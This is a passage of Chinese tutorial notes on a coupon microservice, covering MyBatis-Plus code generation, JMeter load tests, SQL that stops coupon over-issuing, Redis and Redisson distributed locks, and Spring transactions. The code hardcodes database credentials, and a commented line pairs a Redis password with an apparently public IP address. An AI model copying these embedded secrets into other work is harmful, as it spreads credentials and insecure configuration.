  `coupon_id` bigint(11) DEFAULT NULL COMMENT '优惠券id',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间获得时间',
  `use_state` varchar(32) DEFAULT NULL COMMENT '使用状态  可用 NEW,已使用USED,过期 EXPIRED;',
  `user_id` bigint(11) DEFAULT NULL COMMENT '用户id',
  `user_name` varchar(128) DEFAULT NULL COMMENT '用户昵称',
  `coupon_title` varchar(128) DEFAULT NULL COMMENT '优惠券标题',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `order_id` bigint(11) DEFAULT NULL COMMENT '订单id',
  `price` decimal(16,2) DEFAULT NULL COMMENT '抵扣价格',
  `condition_price` decimal(16,2) DEFAULT NULL COMMENT '满多少才可以使用',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=141 DEFAULT CHARSET=utf8mb4;
```

* 测试数据准备

```
INSERT INTO `coupon` (`id`, `category`, `publish`, `coupon_img`, `coupon_title`, `price`, `user_limit`, `start_time`, `end_time`, `publish_count`, `stock`, `create_time`, `condition_price`)
VALUES
	(18, 'NEW_USER', 'PUBLISH', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', '永久有效-新人注册-0元满减-5元抵扣劵-限领取2张-不可叠加使用', 5.00, 2, '2000-01-01 00:00:00', '2099-01-29 00:00:00', 100000000, 99999991, '2020-12-26 16:33:02', 0.00),
	(19, 'PROMOTION', 'PUBLISH', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', '有效中-21年1月到25年1月-20元满减-5元抵扣劵-限领取2张-不可叠加使用', 5.00, 2, '2000-01-29 00:00:00', '2025-01-29 00:00:00', 10, 3,  '2020-12-26 16:33:03', 20.00),
	(22, 'PROMOTION', 'PUBLISH', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', '过期-20年8月到20年9月-商品id3-6元抵扣劵-限领取1张-可叠加使用', 6.00, 1, '2020-08-01 00:00:00', '2020-09-29 00:00:00', 100, 100, '2020-12-26 16:33:03', 0.00),
	(20, 'PROMOTION', 'PUBLISH', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', '有效中-20年8月到21年9月-商品id1-8.8元抵扣劵-限领取2张-不可叠加使用', 8.80, 2, '2020-08-01 00:00:00', '2021-09-29 00:00:00', 100, 96, '2020-12-26 16:33:03', 0.00),
	(21, 'PROMOTION', 'PUBLISH', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', '有效中-20年8月到21年9月-商品id2-9.9元抵扣劵-限领取2张-可叠加使用', 8.80, 2, '2020-08-01 00:00:00', '2021-09-29 00:00:00', 100, 96, '2020-12-26 16:33:03', 0.00);


```













#### 第3集 优惠券微服务+MybatisPlusGenerator代码自动生成工具

**简介：Mybatis-plus-generator代码自动化生成微服务相关类**

* 配置代码生成（标记TODO的记得修改）

```
public class MyBatisPlusGenerator {

    public static void main(String[] args) {
        //1. 全局配置
        GlobalConfig config = new GlobalConfig();

                // 作者
                config.setAuthor("二当家小D")
                // 生成路径，最好使用绝对路径，window路径是不一样的
                //TODO  TODO  TODO  TODO
                .setOutputDir("/Users/xdclass/Desktop/demo/src/main/java")
                // 文件覆盖
                .setFileOverride(true)
                // 主键策略
                .setIdType(IdType.AUTO)

                .setDateType(DateType.ONLY_DATE)
                // 设置生成的service接口的名字的首字母是否为I，默认Service是以I开头的
                .setServiceName("%sService")

                //实体类结尾名称
                .setEntityName("%sDO")

                //生成基本的resultMap
                .setBaseResultMap(true)

                //不使用AR模式
                .setActiveRecord(false)

                //生成基本的SQL片段
                .setBaseColumnList(true);

        //2. 数据源配置
        DataSourceConfig dsConfig = new DataSourceConfig();
        // 设置数据库类型
        dsConfig.setDbType(DbType.MYSQL)
                .setDriverName("com.mysql.cj.jdbc.Driver")
                //TODO  TODO  TODO  TODO
                .setUrl("jdbc:mysql://127.0.0.1:3306/xdclass_user?useSSL=false")
                .setUsername("root")
                .setPassword("xdclass.net");

        //3. 策略配置globalConfiguration中
        StrategyConfig stConfig = new StrategyConfig();

        //全局大写命名
        stConfig.setCapitalMode(true)
                // 数据库表映射到实体的命名策略
                .setNaming(NamingStrategy.underline_to_camel)

                //使用lombok
                .setEntityLombokModel(true)

                //使用restcontroller注解
                .setRestControllerStyle(true)

                // 生成的表, 支持多表一起生成，以数组形式填写
                //TODO  TODO  TODO  TODO
                .setInclude("user","address");

        //4. 包名策略配置
        PackageConfig pkConfig = new PackageConfig();
        pkConfig.setParent("net.xdclass")
                .setMapper("mapper")
                .setService("service")
                .setController("controller")
                .setEntity("model")
                .setXml("mapper");

        //5. 整合配置
        AutoGenerator ag = new AutoGenerator();
        ag.setGlobalConfig(config)
                .setDataSource(dsConfig)
                .setStrategy(stConfig)
                .setPackageInfo(pkConfig);

        //6. 执行操作
        ag.execute();
        System.out.println("======= 小滴课堂 Done 相关代码生成完毕  ========");
    }
}
```



* 导入生成好的代码
  * model (为啥不放common项目，如果是确定每个服务都用到的依赖或者类才放到common项目)
  * mapper 类接口拷贝
  * resource/mapper文件夹 xml脚本拷贝
  * controller
  * service 不拷贝













#### 第4集  新版MybatisPlus分页插件配置+优惠券分页列表接口

**简介：Mybatis-plus-分页插件配置+优惠劵列表开发**

* MybatisPlus分页插件配置（Common项目配置）

```
@Configuration
public class MybatisPlusPageConfig {

    /*	旧版本配置
	@Bean
	public PaginationInterceptor paginationInterceptor(){
		return new PaginationInterceptor();
	}*/

    /**
     * 新的分页插件,一缓和二缓遵循mybatis的规则,
     * 需要设置 MybatisConfiguration#useDeprecatedExecutor = false 避免缓存出现问题
     */
    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor() {
        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
        interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));
        return interceptor;
    }

}

```





* 优惠券列表分页接口开发

```
 @Override
    public Map<String, Object> pageCouponActivity(int page, int size) {
        //第1页，每页2条
        Page<CouponDO> pageInfo = new Page<>(page, size);
        IPage<CouponDO> couponDOPage = couponMapper.selectPage(pageInfo, new QueryWrapper<CouponDO>()
                .eq("publish", CouponPublishEnum.PUBLISH)
                .eq("category", CouponCategoryEnum.PROMOTION)
                .orderByDesc("create_time"));

        Map<String, Object> pageMap = new HashMap<>(3);

        pageMap.put("total_record", couponDOPage.getTotal());
        pageMap.put("total_page", couponDOPage.getPages());
        pageMap.put("current_data", couponDOPage.getRecords().stream().map(obj -> beanProcess(obj)).collect(Collectors.toList()));

        return pageMap;
    }

```















#### 第5集 优惠券微服务-登录拦截器配置-SwaggerUI配置

**简介：登录拦截器配置和SwaggerUI接口文档配置**

* 配置登录拦截器

```
@Configuration
public class InterceptorConfig implements WebMvcConfigurer {


    @Bean
    LoginInterceptor loginInterceptor() {
        return new LoginInterceptor();
    }


    @Override
    public void addInterceptors(InterceptorRegistry registry) {

        registry.addInterceptor(loginInterceptor())
                .addPathPatterns("/api/coupon_record/*/**")
                .addPathPatterns("/api/coupon/*/**")

                //不拦截的路径              
                .excludePathPatterns("/api/coupon/*/page_coupon");

        WebMvcConfigurer.super.addInterceptors(registry);
    }


}

```



* 领劵controller接口开发



* SwaggerUI接口文档





















#### 第6集 优惠券微服务-C端领劵接口核心校验业务逻辑开发

**简介：C端用户领劵接口核心业务逻辑开发**

* service层开发

  * 业务逻辑

  ```
  @Override
  public JsonData addCoupon(long couponId, String couponCategory) {
  
  LoginUser loginUser = LoginInterceptor.threadLocal.get();
  CouponDO couponDO = couponMapper.selectOne(new QueryWrapper<CouponDO>().eq("id", couponId)
                      .eq("category", couponCategory)
                      .eq("publish", CouponPublishEnum.PUBLISH));
  
              this.couponCheck(couponDO,loginUser.getId());
  
              CouponRecordDO couponRecordDO = new CouponRecordDO();
              BeanUtils.copyProperties(couponDO,couponRecordDO);
              couponRecordDO.setCreateTime(new Date());
              couponRecordDO.setUseState(CouponStateEnum.NEW.name());
              couponRecordDO.setUserId(loginUser.getId());
              couponRecordDO.setUserName(loginUser.getName());
              couponRecordDO.setCouponId(couponId);
              couponRecordDO.setId(null);
              
              //高并发下扣减劵库存，采用乐观锁,当前stock做版本号,延伸多种防止超卖的问题,一次只能领取1张，TODO
              int rows = couponMapper.reduceStock(couponId,couponDO.getStock());
              if(rows == 1){
                  //库存扣减成功才保存
                  couponRecordMapper.insert(couponRecordDO);
              }else {
                  log.warn("发放优惠券失败:{},用户:{}",couponDO,loginUser);
                  throw new BizException(BizCodeEnum.COUPON_NO_STOCK);
              }
  
          return JsonData.buildSuccess();
      }
  ```

  * 优惠券校验逻辑

  ```
   /**
       * 优惠券检查
       * @param couponDO
       * @param userId
       */
      private void couponCheck(CouponDO couponDO,long userId){
  
          //优惠券不存在
          if(couponDO == null){
              throw  new BizException(BizCodeEnum.COUPON_NO_EXITS);
          }
          //库存不足
          if(couponDO.getStock()<=0){
              throw  new BizException(BizCodeEnum.COUPON_NO_STOCK);
          }
          //是否在领取时间范围
          long time = CommonUtil.getCurrentTimestamp();
          long start = couponDO.getStartTime().getTime();
          long end = couponDO.getEndTime().getTime();
          if(time < start || time > end){
              throw  new BizException(BizCodeEnum.COUPON_OUT_OF_TIME);
          }
          //用户是否超过限制
          int recordNum = couponRecordMapper.selectCount(new QueryWrapper<CouponRecordDO>()
                  .eq("coupon_id",couponDO.getId())
                  .eq("user_id",userId));
  
          if(recordNum>=couponDO.getUserLimit()){
              throw  new BizException(BizCodeEnum.COUPON_OUT_OF_LIMIT);
          }
      }
  ```

  

  * 找出上面的业务可能存的问题，大家自行思考

    













**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十四章  Jmeter5.X压力测试+高并发下领劵扣减库存的方式



#### 第1集  接口压测和常用压力测试工具对比

**简介：目前用的常用测试工具对比**

- LoadRunner
  - 性能稳定，压测结果及细粒度大，可以自定义脚本进行压测，但是太过于重大，功能比较繁多

- Apache AB(单接口压测最方便)
  - 模拟多线程并发请求,ab命令对发出负载的计算机要求很低，既不会占用很多CPU，也不会占用太多的内存，但却会给目标服务器造成巨大的负载, 简单DDOS攻击等

- Webbench
  - webbench首先fork出多个子进程，每个子进程都循环做web访问测试。子进程把访问的结果通过pipe告诉父进程，父进程做最终的统计结果。

- Jmeter

  - 开源免费，功能强大，在互联网公司普遍使用 
  - 压测不同的协议和应用 
    - 1) Web - HTTP, HTTPS (Java, NodeJS, PHP, ASP.NET, …) 
    - 2) SOAP / REST Webservices 
    - 3) FTP 
    - 4) Database via JDBC 
    - 5) LDAP 轻量目录访问协议 
    - 6) Message-oriented middleware (MOM) via JMS 
    - 7) Mail - SMTP(S), POP3(S) and IMAP(S) 
    - 8) TCP等等
  - 使用场景及优点 
    - 1）功能测试 
    - 2）压力测试 
    - 3）分布式压力测试 
    - 4）纯java开发 
    - 5）上手容易，高性能 
    - 4）提供测试数据分析 
    - 5）各种报表数据图形展示

 

*  压测工具本地快速安装Jmeter5.x
   * 需要安装JDK8 以上
   * 建议安装JDK环境，虽然JRE也可以，但是压测https需要JDK里面的 keytool工具
   * 快速下载 https://jmeter.apache.org/download_jmeter.cgi
   * 文档地址：http://jmeter.apache.org/usermanual/get-started.html

















#### 第2集  Jmeter5.x目录文件讲解+汉化操作

简介:讲解jmeter解压文件里面的各个目录，文件等

- 目录

  ```
  bin:核心可执行文件，包含配置
          jmeter.bat: windows启动文件(window系统一定要配置显示文件拓展名)
          jmeter: mac或者linux启动文件
          jmeter-server：mac或者Liunx分布式压测使用的启动文件
          jmeter-server.bat：window分布式压测使用的启动文件
          jmeter.properties: 核心配置文件   
  extras：插件拓展的包
  
  lib:核心的依赖包
  ```

- Jmeter语言版本中英文切换

  - 控制台修改 menu -> options -> choose language

- 配置文件修改

  - bin目录 -> jmeter.properties
  - 默认 #language=en
  - 改为 language=zh_CN



















####  第3集 Jmeter5.X基础功能组件介绍+线程组和Sampler

**简介：讲解Jmeter里面GUI菜单栏主要组件**

- 添加->threads->线程组（控制总体并发）

  ```
  线程数：虚拟用户数。一个虚拟用户占用一个进程或线程
  
  准备时长（Ramp-Up Period(in seconds)）：全部线程启动的时长，比如100个线程，20秒，则表示20秒内 100个线程都要启动完成，每秒启动5个线程
  
  循环次数：每个线程发送的次数，假如值为5，100个线程，则会发送500次请求，可以勾选永远循环
  ```

   

- 线程组->添加-> Sampler(采样器) -> Http （一个线程组下面可以增加几个Sampler）

  ```
  名称：采样器名称
  注释：对这个采样器的描述
  web服务器：
    默认协议是http
    默认端口是80
    服务器名称或IP ：请求的目标服务器名称或IP地址
  
  路径：服务器URL
  ```

   

- 查看测试结果

  ```
  线程组->添加->监听器->察看结果树
  线程组->添加->监听器->聚合报告
  ```

  

















#### 第4集 Jmeter5.x实战之优惠券列表接口压测+聚合报告分析

**简介：优惠券列表接口压测+结果聚合报告**

- 优惠券列表接口压测

- 新增聚合报告：线程组->添加->监听器->聚合报告（Aggregate Report）

```
  lable: sampler的名称
  Samples: 一共发出去多少请求,例如10个用户，循环10次，则是 100
  Average: 平均响应时间
  Median: 中位数，也就是 50％ 用户的响应时间


  90% Line : 90％ 用户的响应不会超过该时间 （90% of the samples took no more than this time.     The remaining samples at least as long as this）
  95% Line : 95％ 用户的响应不会超过该时间
  99% Line : 99％ 用户的响应不会超过该时间
  min : 最小响应时间
  max : 最大响应时间

  

  Error%：错误的请求的数量/请求的总数
  Throughput： 吞吐量——默认情况下表示每秒完成的请求数（Request per Second) 可类比为qps、tps
  KB/Sec: 每秒接收数据量
```

















####  第5集 优惠券领劵接口-Jmeter压测扣超发优惠券问题暴露

**简介：Jmeter压测领劵接口-超发优惠券问题暴露**

* 新建接口压测计划

* 压测领劵接口

* 完成xml编写

  ```
  <!--扣减库存-->
      <update id="reduceStock">
          update coupon set stock=stock-1 where id = #{couponId}
      </update>
  ```

* 问题

  * 扣减存储为负数，超发优惠券
  * 给公司造成资损

























####  第6集 高并发下怎样优雅的保证扣减库存数据的正确性

**简介：高并发下扣减库存的常见解决方案介绍**

* 这里不谈秒杀设计,不谈使用队列等使请求串行化, 

  * 秒杀的话：限流、队列、异步，可以看小滴课堂专题视频

  

* 我们谈下怎么用锁来保证数据正确，防止超发导致库存是负数，你能下想几种方式

  先看下面的是精简版的时序图

  ![image-20210206232900188](../../../Library/Application Support/typora-user-images/image-20210206232900188.png)

  * 同步代码块synchronized ,lock

  ```
  public synchronized void reduceCouponStock(long couponId ,Integer num) {
  //业务逻辑
  }
  
  问题：synchronized 作用范围是单个jvm实例, 如果做了集群分布式等，就失效了,且单机JVM加锁后就是串行等待问题
  ```

  

  * 分布式锁 zookeeper,redis  (后续会讲到分布式锁的知识)

  ```
  可以解决问题
  
  问题：过于笨重，性能有所下降
  ```

  

  * 直接数据库更新扣减 

  ```
  update coupon set stock=stock - #{num} where id = #{couponId} and stock>0
  //测试如果num大于已有库存，则会变负数
  update coupon set stock=stock - #{num} where id = #{couponId} and （stock - #{num})>=0
  或者
  update coupon set stock=stock - #{num} where id = #{couponId} and stock >= #{num} 
  //修复了负数问题
  
  ```

  

  * 如果扣减最多1个，则直接使用这种就行

  ```
  update coupon set stock=stock-1 where id = #{couponId} and stock>0 
  
  延伸
  update coupon set stock=stock-1 where id = #{couponId} and stock = #{oldStock}
  问题：扣减库存，如果别人补充库存，就存在ABA问题，看业务是否有这个限制，大课采用上面那种
  比如
  C线程查出来是10个
  A线程扣减1个，剩9个
  B线程更新了库存，变回10个
  C更新的时候发现还是10个，则更新成功， 所以避免这个问题，要求不管谁修改了库存，一定要加个version递增版本号
  
  update coupon set stock=stock-1,version=version+1 where id = #{couponId} and stock>0 and versoin=#{oldVersion}
  ```


* 代码编写

```
<!--扣减库存，如果别人补充库存，则可能存在ABA问题-->
    <update id="reduceStock">
        update coupon set stock=stock-1 where id = #{couponId} and stock>0
    </update>
```



​		















#### 第7集 大厂面试热身赛-天猫超市-二面面试题-P7技术专家岗

**简介：大厂面试题，高并发库存扣减超卖问题解决，多种sql适合场景**

* 题目：高并发库存扣减超卖问题，很多人加了乐观锁版本号去解决，那下面三种有什么区别，分别适合哪些场景使用

```
1）update product set stock=stock-1 where id = 1 and stock>0

2）update product set stock=stock-1 where stock=#{原先查询的库存}  and id = 1 and stock>0

3）update product set stock=stock-1,versioin = version+1 where  id = 1 and stock>0 and version=#{原先查询的版本号} 
```



* 答案 : 核心是解决超卖的问题，就是防止库存为负数

```
方案一：id是主键索引的前提下，如果每次只是减少1个库存，则可以采用上面的方式，只做数据安全
校验，可以有效减库存，性能更高，避免大量无用sql，只要有库存就也可以操作成功.
场景：高并发场景下的取号器，优惠券发放扣减库存等


方案二：使用业务自身的条件做为乐观锁，但是存在ABA问题，对比方案三的好处是不用增加version版本字段。如果只是扣减库存且不在意ABA问题时，则可以采用上面的方式，但业务性能相对方案一就差了点，因为库存变动后sql就会无效


方案三：增加版本号主要是为了解决ABA问题，数据读取后，更新前数据被别人篡改过，version只能做递增
场景：商品秒杀、优惠券方法，需要记录库存操作前后的业务


三个方案各有利弊，看业务场景而定
```















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十五章  原生分布式锁-Redisson分布式锁防止个人超领优惠券



#### 第1集 一行代码10个bug-单用户超领优惠券问题介绍

**简介：讲解单用户优惠券超领业务问题和效果演示**

* 什么单用户超领优惠券
  * 优惠券限制1人限制1张，有些人却领了2张
  * 优惠券限制1人限制2张，有些人却领了3或者4张

* 案例举例和问题来源

```
前面解决了，优惠券超发的问题，但是这个个人领取的时候，有张数限制，

有个生发洗发水100元，有个10元优惠券，每人限制领劵1张

小滴课堂-老王，使用时间暂停思维来发现问题，并发领劵

A线程原先查询出来没有领劵，要再插入领劵记录前暂停
然后B线程原先查询出来也没有领劵，则插入领劵记录，然后A线程也插入领劵记录
老王就有了两个优惠券

问题来源核心：对资源的修改没有加锁，导致多个线程可以同时操作，从而导致数据不正确

解决问题：分布式锁 或者 细粒度分布式锁
```


















#### 第2集 分布式核心技术-关于高并发下分布式锁你知道多少？

**简介：分布式锁核心知识介绍和注意事项**

* 避免单人超领劵
  * 加锁
    * 本地锁：synchronize、lock等，锁在当前进程内，集群部署下依旧存在问题
    * 分布式锁：redis、zookeeper等实现，虽然还是锁，但是多个进程共用的锁标记，可以用Redis、Zookeeper、Mysql等都可以

![image-20210208224458995](img/image-20210208224458995.png)

* 设计分布式锁应该考虑的东西
  * 排他性
    *  在分布式应用集群中，同一个方法在同一时间只能被一台机器上的一个线程执行
  * 容错性
    * 分布式锁一定能得到释放，比如客户端奔溃或者网络中断
  * 满足可重入、高性能、高可用
  * 注意分布式锁的开销、锁粒度

































#### 第3集 基于Redis实现分布式锁的几种坑你是否踩过《上》

**简介：基于Redis实现分布式锁的几种坑**

* 实现分布式锁 可以用 Redis、Zookeeper、Mysql数据库这几种 ,   性能最好的是Redis且是最容易理解

  * 分布式锁离不开 key - value 设置

```
    key 是锁的唯一标识，一般按业务来决定命名，比如想要给一种商品的秒杀活动加锁，key 命名为 “seckill_商品ID” 。value就可以使用固定值，比如设置成1
```


​    

* 基于redis实现分布式锁，文档：http://www.redis.cn/commands.html#string

  * 加锁 SETNX key value

  ```
  setnx 的含义就是 SET if Not Exists，有两个参数 setnx(key, value)，该方法是原子性操作
  
  如果 key 不存在，则设置当前 key 成功，返回 1；
  
  如果当前 key 已经存在，则设置当前 key 失败，返回 0
  ```

  * 解锁 del (key)

  ```
  得到锁的线程执行完任务，需要释放锁，以便其他线程可以进入,调用 del(key)
  ```

  * 配置锁超时 expire (key，30s）

  ```
  客户端奔溃或者网络中断，资源将会永远被锁住,即死锁，因此需要给key配置过期时间，以保证即使没有被显式释放，这把锁也要在一定时间后自动释放
  
  ```

  * 综合伪代码

  ```
  methodA(){
    String key = "coupon_66"
  
    if（setnx（key，1） == 1）{
        expire(key,30,TimeUnit.MILLISECONDS)
        try {
            //做对应的业务逻辑
            //查询用户是否已经领券
            //如果没有则扣减库存
            //新增领劵记录
        } finally {
            del（key）
        }
    }else{
  
      //睡眠100毫秒，然后自旋调用本方法
  		methodA()
    }
  }
  ```

  * 存在哪些问题，大家自行思考下

  

  

  

  

  

  

  

  

  

  

  

  

#### 第4集  基于Redis实现分布式锁的几种坑你是否踩过《下》

**简介：手把手教你彻底掌握分布式锁+原生代码编写**

* * 存在什么问题？

    * 多个命令之间不是原子性操作，如`setnx`和`expire`之间，如果`setnx`成功，但是`expire`失败，且宕机了，则这个资源就是死锁

    ```
    使用原子命令：设置和配置过期时间  setnx / setex
    如: set key 1 ex 30 nx
    java里面 redisTemplate.opsForValue().setIfAbsent("seckill_1",1,30,TimeUnit.MILLISECONDS)
    ```

    ![image-20210209105010981](img/image-20210209105010981.png)

    * 业务超时，存在其他线程勿删，key 30秒过期，假如线程A执行很慢超过30秒，则key就被释放了，其他线程B就得到了锁，这个时候线程A执行完成，而B还没执行完成，结果就是线程A删除了线程B加的锁

    ```
    可以在 del 释放锁之前做一个判断，验证当前的锁是不是自己加的锁, 那 value 应该是存当前线程的标识或者uuid
    
    String key = "coupon_66"
    String value = Thread.currentThread().getId()
    
    if（setnx（key，value） == 1）{
        expire(key,30,TimeUnit.MILLISECONDS)
        try {
            //做对应的业务逻辑
        } finally {
        	//删除锁，判断是否是当前线程加的
        	if(get(key).equals(value)){
    					//还存在时间间隔
    					del（key）
            }
        }
    }else{
    	
    	//睡眠100毫秒，然后自旋调用本方法
    
    }
    ```

    * 进一步细化误删
      * 当线程A获取到正常值时，返回带代码中判断期间锁过期了，线程B刚好重新设置了新值，线程A那边有判断value是自己的标识，然后调用del方法，结果就是删除了新设置的线程B的值
      * 核心还是判断和删除命令 不是原子性操作导致

    

    * 那如何解决呢？下集讲解





















#### 第5集  手把手教你彻底掌握分布式锁lua脚本+redis原生代码编写

**简介：手把手教你彻底掌握分布式锁+原生代码编写**

* 前面说了redis做分布式锁存在的问题

  * 核心是保证多个指令原子性，加锁使用setnx setex 可以保证原子性，那解锁使用 判断和删除怎么保证原子性
  * 文档：http://www.redis.cn/commands/set.html
  * 多个命令的原子性：采用 lua脚本+redis, 由于【判断和删除】是lua脚本执行，所以要么全成功，要么全失败

  ```
  //获取lock的值和传递的值一样，调用删除操作返回1，否则返回0
  
  String script = "if redis.call('get',KEYS[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end";
  
  //Arrays.asList(lockKey)是key列表，uuid是参数
  Integer result = redisTemplate.execute(new DefaultRedisScript<>(script, Integer.class), Arrays.asList(lockKey), uuid);
  ```

  * 全部代码

  ```
  /**
  * 原生分布式锁 开始
  * 1、原子加锁 设置过期时间，防止宕机死锁
  * 2、原子解锁：需要判断是不是自己的锁
  */
  String uuid = CommonUtil.generateUUID();
  String lockKey = "lock:coupon:"+couponId;
  Boolean nativeLock=redisTemplate.opsForValue().setIfAbsent(lockKey,uuid,Duration.ofSeconds(30));
      if(nativeLock){
        //加锁成功
        log.info("加锁：{}",nativeLock);
        try {
             //执行业务  TODO
          }finally {
             String script = "if redis.call('get',KEYS[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end";
  
                  Integer result = redisTemplate.execute(new DefaultRedisScript<>(script, Integer.class), Arrays.asList(lockKey), uuid);
                  log.info("解锁：{}",result);
              }
  
          }else {
              //加锁失败，睡眠100毫秒，自旋重试
              try {
                  TimeUnit.MILLISECONDS.sleep(100L);
              } catch (InterruptedException e) { }
              return addCoupon( couponId, couponCategory);
          }
          //原生分布式锁 结束
  ```

  * 遗留一个问题，锁的过期时间，如何实现锁的自动续期 或者 避免业务执行时间过长，锁过期了？
    * 原生方式的话，一般把锁的过期时间设置久一点，比如10分钟时间





























#### 第6集 基于Redis官方推荐-分布式锁最佳实践介绍

**简介：redis官方推荐-分布式锁最佳实践**

* 原生代码+redis实现分布式锁使用比较复杂，且有些锁续期问题更难处理

  * 官方推荐方式：https://redis.io/topics/distlock
  * 多种实现客户端框架

  ![image-20210209234838064](../../../Library/Application Support/typora-user-images/image-20210209234838064.png)

  * Redisson官方中文文档：https://github.com/redisson/redisson/wiki/%E7%9B%AE%E5%BD%95

* 聚合工程锁定版本，common项目添加依赖（多个服务都会用到分布式锁）

```
<!--分布式锁-->
<dependency>
      <groupId>org.redisson</groupId>
      <artifactId>redisson</artifactId>
      <version>3.10.1</version>
</dependency>

```

* 创建redisson客户端

```
    @Value("${spring.redis.host}")
    private String redisHost;

    @Value("${spring.redis.port}")
    private String redisPort;

    @Value("${spring.redis.password}")
    private String redisPwd;
    
		/**
     * 配置分布式锁
     * @return
     */
    @Bean
    public RedissonClient redissonClient() {
        Config config = new Config();

        //单机模式
        //config.useSingleServer().setPassword("123456").setAddress("redis://8.129.113.233:3308");
        config.useSingleServer().setPassword(redisPwd).setAddress("redis://"+redisHost+":"+redisPort);

        //集群模式
        //config.useClusterServers()
        //.setScanInterval(2000)
        //.addNodeAddress("redis://10.0.29.30:6379", "redis://10.0.29.95:6379")
        // .addNodeAddress("redis://127.0.0.1:6379");

        RedissonClient redisson = Redisson.create(config);

        return redisson;
    }

```

* 模拟controller接口测试























#### 第7集 实战Redisson实现优惠券微服务领劵接口的分布式锁

**简介：redisson实现优惠券微服务领劵接口的分布式锁**

* 优惠券微服务，分布式锁实现方式

```
Lock lock = redisson.getLock("lock:coupon:"+couponId);
//阻塞式等待，一个线程获取锁后，其他线程只能等待，和原生的方式循环调用不一样
lock.lock();
        try {
            CouponDO couponDO = couponMapper.selectOne(new QueryWrapper<CouponDO>().eq("id", couponId)
                    .eq("category", couponCategory)
                    .eq("publish", CouponPublishEnum.PUBLISH));

            this.couponCheck(couponDO,loginUser.getId());

            CouponRecordDO couponRecordDO = new CouponRecordDO();
            BeanUtils.copyProperties(couponDO,couponRecordDO);
            couponRecordDO.setCreateTime(new Date());
            couponRecordDO.setUseState(CouponStateEnum.NEW.name());
            couponRecordDO.setUserId(loginUser.getId());
            couponRecordDO.setUserName(loginUser.getName());
            couponRecordDO.setCouponId(couponId);
            couponRecordDO.setId(null);
            //高并发下扣减劵库存，采用乐观锁,当前stock做版本号,一次只能领取1张
            int rows = couponMapper.reduceStock(couponId);

            if(rows == 1){
                //库存扣减成功才保存
                couponRecordMapper.insert(couponRecordDO);
            }else {
                log.warn("发放优惠券失败:{},用户:{}",couponDO,loginUser);
                throw new BizException(BizCodeEnum.COUPON_NO_STOCK);
            }

        }finally {
            lock.unlock();
        }
```































#### 第8集 Redisson是怎样解决分布式锁的里面的坑

**简介：redisson解决分布式锁里面的坑**

* 问题 :  Redis锁的过期时间小于业务的执行时间该如何续期？  

  * watch dog看门狗机制

  ```
  负责储存这个分布式锁的Redisson节点宕机以后，而且这个锁正好处于锁住的状态时，这个锁会出现锁死的状态。或者业务执行时间过长导致锁过期，
  
  为了避免这种情况的发生，Redisson内部提供了一个监控锁的看门狗，它的作用是在Redisson实例被关闭前，不断的延长锁的有效期。
  
  Redisson中客户端一旦加锁成功，就会启动一个watch dog看门狗。watch dog是一个后台线程，会每隔10秒检查一下，如果客户端还持有锁key，那么就会不断的延长锁key的生存时间
  
  
  默认情况下，看门狗的检查锁的超时时间是30秒钟，也可以通过修改Config.lockWatchdogTimeout来另行指定
  ```

  * 指定加锁时间

  ```
  // 加锁以后10秒钟自动解锁
  // 无需调用unlock方法手动解锁
  lock.lock(10, TimeUnit.SECONDS);
  
  // 尝试加锁，最多等待100秒，上锁以后10秒自动解锁
  boolean res = lock.tryLock(100, 10, TimeUnit.SECONDS);
  
  if (res) {
     try {
       ...
     } finally {
         lock.unlock();
     }
  }
  ```

  











**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十六章 事务传播级别和隔离属性回顾+领劵记录模块开发



#### 第1集 Spring 常见的事务管理-面试常考点

**简介：讲解Spring常见的事务管理**

- 事务：多个操作，要么同时成功，要么失败后一起回滚

  - 具备ACID四种特性
    - Atomic（原子性）
    - Consistency（一致性）
    - Isolation（隔离性）
    - Durability（持久性）

   

- 你知道常见的Spring事务管理方式吗

  - 编程式事务管理

  ```
  代码中调用beginTransaction()、commit()、rollback()等事务管理相关的方法，通过TransactionTempalte手动管理事务(用的少)
  ```

  * 声明式事务管理

  ```
  通过AOP实现，可配置文件方式或者注解方式实现事务的管理控制(用的多)
  ```

  

- 你知道声明式事务管理本质吗：

  * 本质是对方法前后进行拦截，底层是建立在 AOP 的基础之上

  * 在目标方法开始之前创建或者加入一个事务，在执行完目标方法之后根据执行情况提交或者回滚事务















#### 第2集 数据库事务传播级别和隔离属性知识回顾

**简介：讲解Spring事务的传播属性和隔离级别**

- 事物传播行为介绍:

  - 如果在开始当前事务之前，一个事务上下文已经存在，此时有若干选项可以指定一个事务性方法的执行行为

  ```
  @Transactional(propagation=Propagation.REQUIRED) 如果有事务, 那么加入事务, 没有的话新建一个(默认情况下)
  
  @Transactional(propagation=Propagation.NOT_SUPPORTED) 不为这个方法开启事务
  
  @Transactional(propagation=Propagation.REQUIRES_NEW) 不管是否存在事务,都创建一个新的事务,原来的挂起,新的执行完毕,继续执行老的事务
  
  @Transactional(propagation=Propagation.MANDATORY) 必须在一个已有的事务中执行,否则抛出异常
  
  @Transactional(propagation=Propagation.NEVER) 必须在一个没有的事务中执行,否则抛出异常(与Propagation.MANDATORY相反)
  
  @Transactional(propagation=Propagation.SUPPORTS) 如果其他bean调用这个方法,在其他bean中声明事务,那就用事务.如果其他bean没有声明事务,那就不用事务.
  
  @Transactional(propagation=Propagation.NESTED) 如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行； 如果当前没有事务，则该取值等价于Propagation.REQUIRED。
